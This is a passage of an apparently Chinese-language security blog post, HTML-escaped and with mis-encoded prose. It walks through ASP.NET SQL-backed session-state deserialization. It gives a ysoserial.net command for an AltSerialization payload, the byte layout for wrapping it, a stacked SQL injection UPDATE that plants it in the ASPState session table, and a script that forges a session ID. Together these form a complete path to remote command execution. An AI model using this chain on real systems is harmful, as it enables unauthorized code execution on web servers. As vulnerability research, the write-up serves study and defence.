                    &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EndOfStreamException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥çœ‹åˆ°å¯¦éš›ä¸Š DeserializeStoreData åˆæ˜¯æŠŠååºåˆ—åŒ–éç¨‹è½‰äº¤çµ¦å…¶ä»–é¡åˆ¥ï¼Œè€Œä¾æ“šå–å‡ºçš„è³‡æ–™ä¸åŒï¼Œå¯èƒ½æœƒè½‰äº¤çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SessionStateItemCollection.Deserialize&lt;/code&gt; æˆ– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpStaticObjectsCollection.Deserialize&lt;/code&gt; åšè™•ç†ï¼Œåœ¨è§€å¯Ÿç¨‹å¼ç¢¼å¾Œç™¼ç¾ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpStaticObjectsCollection&lt;/code&gt; çš„è™•ç†ç›¸å°å–®ç´”ï¼Œæ‰€ä»¥æˆ‘å€‹äººå°±é¸æ“‡å¾€é€™å€‹åˆ†æ”¯ä¸‹å»ç ”ç©¶ã€‚&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sealed&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ICollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;typename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AltSerialization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadValueFromStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// skipped&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è·Ÿé€²å»ä¸€çœ‹ï¼Œç™¼ç¾ HttpStaticObjectsCollection å–å‡ºä¸€äº› bytes ä¹‹å¾Œï¼ŒåˆæŠŠéç¨‹è½‰äº¤çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AltSerialization.ReadValueFromStream&lt;/code&gt; é€²è¡Œè™•ç†ï¼Œçœ‹åˆ°é€™çš„æœ‹å‹å€‘æˆ–è¨±æœƒè‡‰ä¸Šä¸‰æ¢ç·šåœ°å¿ƒæƒ³ï¼šã€Œè©²ä¸æœƒåˆè¦è¿½é€²å»å§ . . ã€ï¼Œä¸éå…¶å¯¦åˆ°æ­¤ç‚ºæ­¢å°±å·²è¶³å¤ ï¼Œå› ç‚º AltSerialization å¯¦éš›ä¸Šé¡ä¼¼æ–¼ BinaryFormatter çš„åŒ…è£ï¼Œåˆ°æ­¤å·²ç¶“æœ‰è¶³å¤ è³‡è¨Šä½œåˆ©ç”¨ï¼Œå¦å¤–é‚„æœ‰ä¸€å€‹åŸå› å…¼å¥½æ¶ˆæ¯ï¼Œç•¶åˆæˆ‘ç¨‹å¼ç¢¼è¿½åˆ°æ­¤è™•æ™‚ï¼Œä¸Šç¶²ä¸€æŸ¥é€™å€‹ç‰©ä»¶ï¼Œç™¼ç¾ &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; å·²ç¶“æœ‰å»ºç«‹ AltSerialization ååºåˆ—åŒ– payload çš„ pluginï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æå‡ºé€™å€‹åˆ©å™¨ä¾†ä½¿ç”¨ï¼ä¸‹é¢ä¸€è¡ŒæŒ‡ä»¤å°±å¯ä»¥ç”¢ç”ŸåŸ·è¡Œç³»çµ±æŒ‡ä»¤ calc.exe çš„ base64 ç·¨ç¢¼å¾Œçš„ payloadã€‚&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Altserialization &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; HttpStaticObjectsCollection &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;calc.exe&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸éåˆ°æ­¤é‚„æ˜¯æœ‰å€‹å°å•é¡Œéœ€è¦è§£æ±ºï¼Œysoserial.net çš„ AltSerialization plugin æ‰€å»ºç«‹çš„ payload æ˜¯æ”»æ“Š SessionStateItemCollection æˆ– HttpStaticObjectsCollection å…©å€‹é¡åˆ¥çš„ååºåˆ—åŒ–æ“ä½œï¼Œè€Œæˆ‘å€‘å„²å­˜åœ¨è³‡æ–™åº«ä¸­çš„ session åºåˆ—åŒ–è³‡æ–™æ˜¯ç”±åœ¨æ­¤ä¹‹ä¸Šé‚„é¡å¤–ä½œäº†ä¸€å±¤åŒ…è£çš„ SessionStateUtility é¡åˆ¥è™•ç†çš„ï¼Œæ‰€ä»¥å¿…é ˆè¦å†åšé»ä¿®é£¾ã€‚å›é ­å†å»çœ‹çœ‹ç¨‹å¼ç¢¼ï¼Œæœƒç™¼ç¾ SessionStateUtility ä¹Ÿåªæ·»åŠ äº†å¹¾å€‹ bytesï¼Œæ¸›åŒ–å¾Œå¦‚ä¸‹æ‰€ç¤ºï¼š&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å°æ–¼ Int32 è¦æ·»åŠ  4 å€‹ bytesï¼ŒBoolean å‰‡æ˜¯ 1 å€‹ byteï¼Œè€Œå› ç‚ºè¦è®“ç¨‹å¼è·¯å¾‘èƒ½é€²å…¥ HttpStaticObjectsCollection çš„åˆ†æ”¯ï¼Œå¿…é ˆè®“ç¬¬ 6 å€‹ byte ç‚º 1 æ‰èƒ½è®“æ¢ä»¶é”æˆï¼Œå…ˆå°‡åŸæœ¬å¾ ysoserial.net ç”¢å‡ºçš„ payload å¾ base64 è½‰æˆ hex è¡¨ç¤ºï¼Œå†å‰å¾Œå„åˆ¥æ·»åŠ  6ã€1 bytesï¼Œå¦‚ä¸‹ç¤ºæ„åœ–ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  timeout    false  true            HttpStaticObjectsCollection             eof
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”     â”Œâ”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”
00 00 00 00  00     01    010000000001140001000000fff ... ç•¥ ... 0000000a0b ff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¿®é£¾å®Œçš„é€™å€‹ payload å°±èƒ½ç”¨ä¾†æ”»æ“Š SessionStateUtility é¡åˆ¥äº†ï¼&lt;/p&gt;

&lt;p&gt;æœ€å¾Œçš„æ­¥é©Ÿå°±æ˜¯åˆ©ç”¨é–‹é ­çš„ SQL Injection å°‡æƒ¡æ„çš„åºåˆ—åŒ–å…§å®¹æ³¨å…¥é€²å»è³‡æ–™åº«ï¼Œå¦‚æœæ­£å¸¸ç€è¦½ç›®æ¨™ç¶²ç«™æ™‚æœ‰å‡ºç¾ ASP.NET_SessionId çš„ Cookie å°±ä»£è¡¨å·²ç¶“æœ‰ä¸€ç­†å°æ‡‰çš„ Session è¨˜éŒ„å„²å­˜åœ¨è³‡æ–™åº«è£¡ï¼Œæ‰€ä»¥æˆ‘å€‘åªéœ€è¦åŸ·è¡Œå¦‚ä¸‹çš„ SQL Update èªå¥ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?id=1; UPDATE ASPState.dbo.ASPStateTempSessions
       SET SessionItemShort = 0x{Hex_Encoded_Payload}
       WHERE SessionId LIKE &apos;{ASP.NET_SessionId}%25&apos;; --
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åˆ†åˆ¥å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{ASP.NET_SessionId}&lt;/code&gt; æ›¿æ›æˆè‡ªå·±çš„ ASP.NET_SessionId çš„ Cookie å€¼ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{Hex_Encoded_Payload}&lt;/code&gt; æ›¿æ›æˆå‰é¢æº–å‚™å¥½çš„åºåˆ—åŒ– payload å³å¯ã€‚&lt;/p&gt;

&lt;p&gt;é‚£å‡å¦‚æ²’æœ‰ ASP.NET_SessionId æ€éº¼è¾¦ï¼Ÿé€™è¡¨ç¤ºç›®æ¨™å¯èƒ½é‚„æœªå„²å­˜ä»»ä½•è³‡æ–™åœ¨ Session ä¹‹ä¸­ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸æœƒç”¢ç”Ÿä»»ä½•è¨˜éŒ„åœ¨è³‡æ–™åº«è£¡ï¼Œä½†æ—¢ç„¶æ²’æœ‰çš„è©±ï¼Œé‚£æˆ‘å€‘å°±ç¡¬å¡ä¸€å€‹ Cookie çµ¦å®ƒï¼ASP.NET çš„ SessionId æ˜¯é€éäº‚æ•¸ç”¢ç”Ÿçš„ 24 å€‹å­—å…ƒï¼Œä½†ä½¿ç”¨äº†å®¢è£½åŒ–çš„å­—å…ƒé›†ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä»¥ä¸‹çš„ Python script ç”¢ç”Ÿä¸€çµ„ SessionIdï¼Œä¾‹å¦‚ï¼šplxtfpabykouhu3grwv1j1qwï¼Œä¹‹å¾Œå¸¶ä¸Š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cookie: ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; ç€è¦½ä»»ä¸€å€‹ aspx é é¢ï¼Œç†è«–ä¸Š ASP.NET å°±æœƒè‡ªå‹•åœ¨è³‡æ–™åº«è£¡æ·»åŠ ä¸€ç­†è¨˜éŒ„ã€‚&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;abcdefghijklmnopqrstuvwxyz012345&apos;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å‡å¦‚åœ¨è³‡æ–™åº«è£¡ä»ç„¶æ²’æœ‰ä»»ä½•è¨˜éŒ„å‡ºç¾ï¼Œé‚£å°±åªèƒ½æ‰‹å‹•åˆ» INSERT çš„ SQL ä¾†å‰µé€ ä¸€å€‹è¨˜éŒ„ï¼Œè‡³æ–¼å¦‚ä½•åˆ»å‡ºé€™éƒ¨åˆ†ï¼Ÿåªè¦çœ‹çœ‹ç¨‹å¼ç¢¼æ‡‰è©²å°±å¯ä»¥å¾ˆå®¹æ˜“æ§‹é€ å‡ºä¾†ï¼Œæ‰€ä»¥ç•™çµ¦å¤§å®¶è‡ªè¡Œå»ç© :P&lt;/p&gt;

&lt;p&gt;ç­‰åˆ° Payload é †åˆ©æ³¨å…¥å¾Œï¼Œåªè¦å†æ¬¡ç”¨é€™å€‹ Cookie &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; ç€è¦½ä»»ä½•ä¸€å€‹ aspx é é¢ï¼Œå°±æœƒè§¸ç™¼ååºåˆ—åŒ–åŸ·è¡Œä»»æ„ç³»çµ±æŒ‡ä»¤ï¼&lt;/p&gt;

